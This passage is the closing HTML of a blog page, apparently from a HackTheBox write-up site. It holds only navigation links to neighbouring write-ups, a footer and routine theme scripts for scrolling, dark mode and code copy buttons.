      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
      <li><a href="http://localhost:1313/tags/medium/">Medium</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/writeups/hackthebox/busqueda/">
    <span class="title">« Prev</span>
    <br>
    <span>Busqueda Writeup - HackTheBox</span>
  </a>
  <a class="next" href="http://localhost:1313/writeups/hackthebox/freelancer/">
    <span class="title">Next »</span>
    <br>
    <span>Freelancer Writeup - HackTheBox</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">Rezy Dev</a></span> · 

    <span>
        <a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="noopener noreferrer" target="_blank">Some rights reserved</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
